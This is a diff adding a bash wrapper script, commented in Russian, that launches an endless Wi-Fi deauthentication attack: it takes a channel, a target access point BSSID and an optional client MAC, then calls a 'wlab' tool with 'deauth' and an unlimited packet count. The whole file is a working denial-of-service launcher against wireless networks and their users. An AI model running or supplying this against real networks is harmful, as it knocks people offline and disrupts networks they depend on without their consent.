@@ -1,0 +1,16 @@
+#!/usr/bin/env bash
+# v9-совместимость: wtaak <канал> <BSSID> [MAC клиента] — бесконечный деаут
+set -euo pipefail
+WLAB_BIN=/usr/bin/wlab
+[[ -x "$WLAB_BIN" ]] || WLAB_BIN=/usr/local/bin/wlab
+
+CH="${1:-}"; BSSID="${2:-}"; MAC="${3:-}"
+
+if [[ -z "$CH" || -z "$BSSID" ]]; then
+  echo "Использование: wtaak <канал> <BSSID> [MAC клиента]"
+  exit 1
+fi
+
+ARGS=(-c "$CH" -b "$BSSID" -n 0)
+[[ -n "$MAC" ]] && ARGS+=(-t "$MAC")
+exec "$WLAB_BIN" deauth "${ARGS[@]}"
